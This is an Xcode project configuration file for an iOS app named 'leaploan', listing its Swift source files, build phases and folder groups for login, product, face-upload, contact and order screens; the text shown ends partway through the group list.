// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		0169C223D4B0CBD72EE17C25 /* Pods_leaploan.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C3FFCD76033F537953878033 /* Pods_leaploan.framework */; };
		7333CD6B2EB4E27400C55A91 /* AppEmptyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333CD6A2EB4E27400C55A91 /* AppEmptyView.swift */; };
		7333CD6D2EB4E66000C55A91 /* AppHomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333CD6C2EB4E66000C55A91 /* AppHomeView.swift */; };
		7333CD712EB4E67300C55A91 /* AppMainView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333CD702EB4E67300C55A91 /* AppMainView.swift */; };
		7333CD732EB4EA6800C55A91 /* AppHomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333CD722EB4EA6200C55A91 /* AppHomeViewModel.swift */; };
		7333CD762EB4FBA300C55A91 /* ProductDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333CD752EB4FBA300C55A91 /* ProductDetailViewController.swift */; };
		7333CD782EB4FD4C00C55A91 /* ProductViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333CD772EB4FD4500C55A91 /* ProductViewModel.swift */; };
		7333CD7A2EB5043C00C55A91 /* ProductDetailListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333CD792EB5043C00C55A91 /* ProductDetailListView.swift */; };
		7333CD7C2EB506A800C55A91 /* ProductListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333CD7B2EB506A800C55A91 /* ProductListView.swift */; };
		735FD1112EB99D0A007DE61E /* SelectNameView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD1102EB99D0A007DE61E /* SelectNameView.swift */; };
		735FD1142EB9A22A007DE61E /* SelectViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD1132EB9A22A007DE61E /* SelectViewCell.swift */; };
		735FD1162EB9A238007DE61E /* CommonViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD1152EB9A238007DE61E /* CommonViewCell.swift */; };
		735FD1192EB9D732007DE61E /* PersonalViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD1182EB9D732007DE61E /* PersonalViewController.swift */; };
		735FD11B2EB9E746007DE61E /* PersonalViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD11A2EB9E741007DE61E /* PersonalViewModel.swift */; };
		735FD11F2EBA2C8D007DE61E /* SwitchModelConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD11E2EBA2C80007DE61E /* SwitchModelConfig.swift */; };
		735FD1232EBA3D54007DE61E /* WorkViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD1222EBA3D54007DE61E /* WorkViewController.swift */; };
		735FD1252EBA3D74007DE61E /* WorkViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD1242EBA3D73007DE61E /* WorkViewModel.swift */; };
		735FD1282EBA3E96007DE61E /* ConactCheckViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD1272EBA3E96007DE61E /* ConactCheckViewController.swift */; };
		735FD12A2EBA3EB0007DE61E /* ConactCheckViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD1292EBA3EAF007DE61E /* ConactCheckViewModel.swift */; };
		73792E422EB639C500CA24AA /* SelectAuthViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73792E412EB639C500CA24AA /* SelectAuthViewController.swift */; };
		73792E462EB6440000CA24AA /* FaceViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73792E452EB6440000CA24AA /* FaceViewController.swift */; };
		73792E482EB6477C00CA24AA /* FaceTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73792E472EB6477C00CA24AA /* FaceTableViewCell.swift */; };
		73792E4A2EB64D1F00CA24AA /* StepHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73792E492EB64D1F00CA24AA /* StepHeadView.swift */; };
		73792E4E2EB7A3B200CA24AA /* FaceUploadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73792E4D2EB7A3B200CA24AA /* FaceUploadView.swift */; };
		73792E502EB7A58E00CA24AA /* FaceUploadListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73792E4F2EB7A58E00CA24AA /* FaceUploadListView.swift */; };
		737D85892EBC30C60010972E /* AppLocationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D85882EBC30C60010972E /* AppLocationManager.swift */; };
		737D858B2EBC4A210010972E /* MisassertViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D858A2EBC4A090010972E /* MisassertViewModel.swift */; };
		737D858D2EBC83730010972E /* DeviceManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D858C2EBC836C0010972E /* DeviceManager.swift */; };
		7382D8812EB4512C00C3CFF0 /* OrderListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7382D8802EB4512C00C3CFF0 /* OrderListViewCell.swift */; };
		7382D8832EB4529000C3CFF0 /* OrderListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7382D8822EB4528E00C3CFF0 /* OrderListViewModel.swift */; };
		738D55C02EBB8E3A00DBB17F /* OrderCheckView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 738D55BF2EBB8E3A00DBB17F /* OrderCheckView.swift */; };
		738D55C42EBB90A900DBB17F /* OrderListMinView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 738D55C32EBB90A900DBB17F /* OrderListMinView.swift */; };
		738D55C62EBB945000DBB17F /* OrderCenterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 738D55C52EBB945000DBB17F /* OrderCenterViewController.swift */; };
		7392DEEF2EB30610003D831B /* CenterListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7392DEEE2EB30610003D831B /* CenterListView.swift */; };
		7392DEF32EB32D8A003D831B /* SettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7392DEF22EB32D8A003D831B /* SettingViewController.swift */; };
		7392DEF52EB33005003D831B /* AppHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7392DEF42EB33005003D831B /* AppHeadView.swift */; };
		7392DEF72EB35BB1003D831B /* AppPopAlertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7392DEF62EB35BB1003D831B /* AppPopAlertView.swift */; };
		7392DEF92EB35F5E003D831B /* SettingViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7392DEF82EB35F57003D831B /* SettingViewModel.swift */; };
		739C7FA92EB1EAEA00677C85 /* CenterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739C7FA82EB1EAEA00677C85 /* CenterViewController.swift */; };
		739C7FAB2EB1EAF900677C85 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739C7FAA2EB1EAF900677C85 /* HomeViewController.swift */; };
		739C7FAD2EB1EB0F00677C85 /* OrderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739C7FAC2EB1EB0F00677C85 /* OrderViewController.swift */; };
		739C7FB12EB1ED9D00677C85 /* CenterPageView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739C7FB02EB1ED9D00677C85 /* CenterPageView.swift */; };
		739C806F2EB2017500677C85 /* CenterPageViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739C806E2EB2017200677C85 /* CenterPageViewModel.swift */; };
		73A3053B2EB7AD4C008982DC /* FaceViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A3053A2EB7AD46008982DC /* FaceViewModel.swift */; };
		73A3053D2EB7AE36008982DC /* ChoosePhotoView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A3053C2EB7AE36008982DC /* ChoosePhotoView.swift */; };
		73A3053F2EB7B0D9008982DC /* AlbumPickerManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A3053E2EB7B0D8008982DC /* AlbumPickerManager.swift */; };
		73AD1BAC2EBAE54800EFD9E2 /* PhoneConnectViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD1BAB2EBAE54800EFD9E2 /* PhoneConnectViewCell.swift */; };
		73AD1BAE2EBAF2CF00EFD9E2 /* ContactsUtil.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD1BAD2EBAF2C400EFD9E2 /* ContactsUtil.swift */; };
		73AD1BB02EBB025E00EFD9E2 /* H5WebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD1BAF2EBB025E00EFD9E2 /* H5WebViewController.swift */; };
		73AD1BB22EBB2FBE00EFD9E2 /* HomeHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD1BB12EBB2FBE00EFD9E2 /* HomeHeaderView.swift */; };
		73AD1BB42EBB301600EFD9E2 /* ProductListCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD1BB32EBB301600EFD9E2 /* ProductListCell.swift */; };
		73AD1BB62EBB35B100EFD9E2 /* ProductItemListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD1BB52EBB35B100EFD9E2 /* ProductItemListView.swift */; };
		73B2B1F02EB09A9700F3A877 /* httpsRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B2B1EF2EB09A9700F3A877 /* httpsRequest.swift */; };
		73B2B1F22EB0A21000F3A877 /* commonPara.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B2B1F12EB0A20E00F3A877 /* commonPara.swift */; };
		73B2B1F42EB0A73E00F3A877 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B2B1F32EB0A73E00F3A877 /* LoginView.swift */; };
		73B2B1F62EB0A74F00F3A877 /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B2B1F52EB0A74A00F3A877 /* LoginViewModel.swift */; };
		73B2B1F82EB0A7AD00F3A877 /* Model.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B2B1F72EB0A7A900F3A877 /* Model.swift */; };
		73B2B1FC2EB0AEBC00F3A877 /* LaunchViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B2B1FB2EB0AEBC00F3A877 /* LaunchViewController.swift */; };
		73B2B1FE2EB0AF4F00F3A877 /* other.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B2B1FD2EB0AF4D00F3A877 /* other.swift */; };
		73B2B2002EB0B16B00F3A877 /* LaunchViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B2B1FF2EB0B16400F3A877 /* LaunchViewModel.swift */; };
		73D129C82EB08B2F00079434 /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D129C72EB08B2F00079434 /* BaseViewController.swift */; };
		73D129CE2EB08B5A00079434 /* BaseTabBarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D129CD2EB08B5A00079434 /* BaseTabBarController.swift */; };
		73D129D02EB08B6D00079434 /* BaseNavigationController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D129CF2EB08B6D00079434 /* BaseNavigationController.swift */; };
		73D129D22EB08C0D00079434 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D129D12EB08C0D00079434 /* LoginViewController.swift */; };
		73D129D42EB08C2B00079434 /* loginAuthManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D129D32EB08C2100079434 /* loginAuthManager.swift */; };
		73F59DEC2EAF638100A68B13 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73F59DE32EAF638100A68B13 /* Assets.xcassets */; };
		73F59DEE2EAF638100A68B13 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73F59DE62EAF638100A68B13 /* LaunchScreen.storyboard */; };
		73F59DF02EAF638100A68B13 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F59DE22EAF638100A68B13 /* AppDelegate.swift */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		732709952EBC84D600DB6D8C /* leaploan.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = leaploan.entitlements; sourceTree = "<group>"; };
		7333CD6A2EB4E27400C55A91 /* AppEmptyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppEmptyView.swift; sourceTree = "<group>"; };
		7333CD6C2EB4E66000C55A91 /* AppHomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppHomeView.swift; sourceTree = "<group>"; };
		7333CD702EB4E67300C55A91 /* AppMainView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppMainView.swift; sourceTree = "<group>"; };
		7333CD722EB4EA6200C55A91 /* AppHomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppHomeViewModel.swift; sourceTree = "<group>"; };
		7333CD752EB4FBA300C55A91 /* ProductDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailViewController.swift; sourceTree = "<group>"; };
		7333CD772EB4FD4500C55A91 /* ProductViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductViewModel.swift; sourceTree = "<group>"; };
		7333CD792EB5043C00C55A91 /* ProductDetailListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailListView.swift; sourceTree = "<group>"; };
		7333CD7B2EB506A800C55A91 /* ProductListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductListView.swift; sourceTree = "<group>"; };
		735FD1102EB99D0A007DE61E /* SelectNameView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectNameView.swift; sourceTree = "<group>"; };
		735FD1132EB9A22A007DE61E /* SelectViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectViewCell.swift; sourceTree = "<group>"; };
		735FD1152EB9A238007DE61E /* CommonViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommonViewCell.swift; sourceTree = "<group>"; };
		735FD1182EB9D732007DE61E /* PersonalViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PersonalViewController.swift; sourceTree = "<group>"; };
		735FD11A2EB9E741007DE61E /* PersonalViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PersonalViewModel.swift; sourceTree = "<group>"; };
		735FD11E2EBA2C80007DE61E /* SwitchModelConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SwitchModelConfig.swift; sourceTree = "<group>"; };
		735FD1222EBA3D54007DE61E /* WorkViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WorkViewController.swift; sourceTree = "<group>"; };
		735FD1242EBA3D73007DE61E /* WorkViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WorkViewModel.swift; sourceTree = "<group>"; };
		735FD1272EBA3E96007DE61E /* ConactCheckViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ConactCheckViewController.swift; sourceTree = "<group>"; };
		735FD1292EBA3EAF007DE61E /* ConactCheckViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ConactCheckViewModel.swift; sourceTree = "<group>"; };
		73792E412EB639C500CA24AA /* SelectAuthViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectAuthViewController.swift; sourceTree = "<group>"; };
		73792E452EB6440000CA24AA /* FaceViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewController.swift; sourceTree = "<group>"; };
		73792E472EB6477C00CA24AA /* FaceTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceTableViewCell.swift; sourceTree = "<group>"; };
		73792E492EB64D1F00CA24AA /* StepHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepHeadView.swift; sourceTree = "<group>"; };
		73792E4D2EB7A3B200CA24AA /* FaceUploadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceUploadView.swift; sourceTree = "<group>"; };
		73792E4F2EB7A58E00CA24AA /* FaceUploadListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceUploadListView.swift; sourceTree = "<group>"; };
		737D85882EBC30C60010972E /* AppLocationManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppLocationManager.swift; sourceTree = "<group>"; };
		737D858A2EBC4A090010972E /* MisassertViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MisassertViewModel.swift; sourceTree = "<group>"; };
		737D858C2EBC836C0010972E /* DeviceManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeviceManager.swift; sourceTree = "<group>"; };
		7382D8802EB4512C00C3CFF0 /* OrderListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewCell.swift; sourceTree = "<group>"; };
		7382D8822EB4528E00C3CFF0 /* OrderListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewModel.swift; sourceTree = "<group>"; };
		738D55BF2EBB8E3A00DBB17F /* OrderCheckView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderCheckView.swift; sourceTree = "<group>"; };
		738D55C32EBB90A900DBB17F /* OrderListMinView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListMinView.swift; sourceTree = "<group>"; };
		738D55C52EBB945000DBB17F /* OrderCenterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderCenterViewController.swift; sourceTree = "<group>"; };
		7392DEEE2EB30610003D831B /* CenterListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterListView.swift; sourceTree = "<group>"; };
		7392DEF22EB32D8A003D831B /* SettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewController.swift; sourceTree = "<group>"; };
		7392DEF42EB33005003D831B /* AppHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppHeadView.swift; sourceTree = "<group>"; };
		7392DEF62EB35BB1003D831B /* AppPopAlertView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppPopAlertView.swift; sourceTree = "<group>"; };
		7392DEF82EB35F57003D831B /* SettingViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewModel.swift; sourceTree = "<group>"; };
		739C7FA82EB1EAEA00677C85 /* CenterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewController.swift; sourceTree = "<group>"; };
		739C7FAA2EB1EAF900677C85 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
		739C7FAC2EB1EB0F00677C85 /* OrderViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewController.swift; sourceTree = "<group>"; };
		739C7FB02EB1ED9D00677C85 /* CenterPageView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterPageView.swift; sourceTree = "<group>"; };
		739C806E2EB2017200677C85 /* CenterPageViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterPageViewModel.swift; sourceTree = "<group>"; };
		73A3053A2EB7AD46008982DC /* FaceViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewModel.swift; sourceTree = "<group>"; };
		73A3053C2EB7AE36008982DC /* ChoosePhotoView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChoosePhotoView.swift; sourceTree = "<group>"; };
		73A3053E2EB7B0D8008982DC /* AlbumPickerManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlbumPickerManager.swift; sourceTree = "<group>"; };
		73AD1BAB2EBAE54800EFD9E2 /* PhoneConnectViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhoneConnectViewCell.swift; sourceTree = "<group>"; };
		73AD1BAD2EBAF2C400EFD9E2 /* ContactsUtil.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactsUtil.swift; sourceTree = "<group>"; };
		73AD1BAF2EBB025E00EFD9E2 /* H5WebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = H5WebViewController.swift; sourceTree = "<group>"; };
		73AD1BB12EBB2FBE00EFD9E2 /* HomeHeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeHeaderView.swift; sourceTree = "<group>"; };
		73AD1BB32EBB301600EFD9E2 /* ProductListCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductListCell.swift; sourceTree = "<group>"; };
		73AD1BB52EBB35B100EFD9E2 /* ProductItemListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductItemListView.swift; sourceTree = "<group>"; };
		73B2B1EF2EB09A9700F3A877 /* httpsRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = httpsRequest.swift; sourceTree = "<group>"; };
		73B2B1F12EB0A20E00F3A877 /* commonPara.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = commonPara.swift; sourceTree = "<group>"; };
		73B2B1F32EB0A73E00F3A877 /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
		73B2B1F52EB0A74A00F3A877 /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
		73B2B1F72EB0A7A900F3A877 /* Model.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Model.swift; sourceTree = "<group>"; };
		73B2B1FB2EB0AEBC00F3A877 /* LaunchViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewController.swift; sourceTree = "<group>"; };
		73B2B1FD2EB0AF4D00F3A877 /* other.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = other.swift; sourceTree = "<group>"; };
		73B2B1FF2EB0B16400F3A877 /* LaunchViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewModel.swift; sourceTree = "<group>"; };
		73D129C72EB08B2F00079434 /* BaseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseViewController.swift; sourceTree = "<group>"; };
		73D129CD2EB08B5A00079434 /* BaseTabBarController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseTabBarController.swift; sourceTree = "<group>"; };
		73D129CF2EB08B6D00079434 /* BaseNavigationController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseNavigationController.swift; sourceTree = "<group>"; };
		73D129D12EB08C0D00079434 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
		73D129D32EB08C2100079434 /* loginAuthManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = loginAuthManager.swift; sourceTree = "<group>"; };
		73F59DCA2EAF637A00A68B13 /* leaploan.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = leaploan.app; sourceTree = BUILT_PRODUCTS_DIR; };
		73F59DE22EAF638100A68B13 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		73F59DE32EAF638100A68B13 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		73F59DE42EAF638100A68B13 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		73F59DE52EAF638100A68B13 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		AFD6AE48504BF3BEC24EB502 /* Pods-leaploan.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-leaploan.debug.xcconfig"; path = "Target Support Files/Pods-leaploan/Pods-leaploan.debug.xcconfig"; sourceTree = "<group>"; };
		C3FFCD76033F537953878033 /* Pods_leaploan.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_leaploan.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		EF0C4AEEE70C3286EC8BD5FE /* Pods-leaploan.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-leaploan.release.xcconfig"; path = "Target Support Files/Pods-leaploan/Pods-leaploan.release.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		73F59DC72EAF637A00A68B13 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				0169C223D4B0CBD72EE17C25 /* Pods_leaploan.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		7333CD742EB4FB8E00C55A91 /* detail */ = {
			isa = PBXGroup;
			children = (
				735FD1122EB9A206007DE61E /* common */,
				73792E4C2EB7A35C00CA24AA /* product */,
				73792E4B2EB7A34A00CA24AA /* face */,
				735FD1172EB9D713007DE61E /* personal */,
				735FD1212EBA3D30007DE61E /* work */,
				735FD1262EBA3E62007DE61E /* contact */,
			);
			path = detail;
			sourceTree = "<group>";
		};
		735FD1122EB9A206007DE61E /* common */ = {
			isa = PBXGroup;
			children = (
				737D858A2EBC4A090010972E /* MisassertViewModel.swift */,
				735FD1132EB9A22A007DE61E /* SelectViewCell.swift */,
				735FD1152EB9A238007DE61E /* CommonViewCell.swift */,
			);
			path = common;
			sourceTree = "<group>";
		};
		735FD1172EB9D713007DE61E /* personal */ = {
			isa = PBXGroup;
			children = (
				735FD11E2EBA2C80007DE61E /* SwitchModelConfig.swift */,
				735FD11A2EB9E741007DE61E /* PersonalViewModel.swift */,
				735FD1182EB9D732007DE61E /* PersonalViewController.swift */,
			);
			path = personal;
			sourceTree = "<group>";
		};
		735FD1212EBA3D30007DE61E /* work */ = {
			isa = PBXGroup;
			children = (
				735FD1242EBA3D73007DE61E /* WorkViewModel.swift */,
				735FD1222EBA3D54007DE61E /* WorkViewController.swift */,
			);
			path = work;
			sourceTree = "<group>";
		};
		735FD1262EBA3E62007DE61E /* contact */ = {
			isa = PBXGroup;
			children = (
				73AD1BAD2EBAF2C400EFD9E2 /* ContactsUtil.swift */,
				735FD1292EBA3EAF007DE61E /* ConactCheckViewModel.swift */,
				735FD1272EBA3E96007DE61E /* ConactCheckViewController.swift */,
				73AD1BAB2EBAE54800EFD9E2 /* PhoneConnectViewCell.swift */,
			);
			path = contact;
			sourceTree = "<group>";
		};
		73792E4B2EB7A34A00CA24AA /* face */ = {
			isa = PBXGroup;
			children = (
				73A3053E2EB7B0D8008982DC /* AlbumPickerManager.swift */,
				73A3053A2EB7AD46008982DC /* FaceViewModel.swift */,
				73792E412EB639C500CA24AA /* SelectAuthViewController.swift */,
				73792E472EB6477C00CA24AA /* FaceTableViewCell.swift */,
				73792E492EB64D1F00CA24AA /* StepHeadView.swift */,
				73792E452EB6440000CA24AA /* FaceViewController.swift */,
				73792E4D2EB7A3B200CA24AA /* FaceUploadView.swift */,
				73792E4F2EB7A58E00CA24AA /* FaceUploadListView.swift */,
				73A3053C2EB7AE36008982DC /* ChoosePhotoView.swift */,
				735FD1102EB99D0A007DE61E /* SelectNameView.swift */,
			);
			path = face;
			sourceTree = "<group>";
		};
		73792E4C2EB7A35C00CA24AA /* product */ = {
			isa = PBXGroup;
			children = (
				7333CD772EB4FD4500C55A91 /* ProductViewModel.swift */,
				7333CD752EB4FBA300C55A91 /* ProductDetailViewController.swift */,
				7333CD792EB5043C00C55A91 /* ProductDetailListView.swift */,
				7333CD7B2EB506A800C55A91 /* ProductListView.swift */,
			);
			path = product;
			sourceTree = "<group>";
		};
		73D129C02EB08AF700079434 /* base */ = {
			isa = PBXGroup;
			children = (
				73B2B1FF2EB0B16400F3A877 /* LaunchViewModel.swift */,
				73D129C72EB08B2F00079434 /* BaseViewController.swift */,
				73D129CD2EB08B5A00079434 /* BaseTabBarController.swift */,
				73D129CF2EB08B6D00079434 /* BaseNavigationController.swift */,
				73B2B1FB2EB0AEBC00F3A877 /* LaunchViewController.swift */,
				73AD1BAF2EBB025E00EFD9E2 /* H5WebViewController.swift */,
			);
			path = base;
			sourceTree = "<group>";
		};
		73D129C12EB08AFD00079434 /* http */ = {
			isa = PBXGroup;
			children = (
				73B2B1F12EB0A20E00F3A877 /* commonPara.swift */,
				73B2B1EF2EB09A9700F3A877 /* httpsRequest.swift */,
				737D85882EBC30C60010972E /* AppLocationManager.swift */,
			);
			path = http;
			sourceTree = "<group>";
		};
		73D129C22EB08B0200079434 /* login */ = {
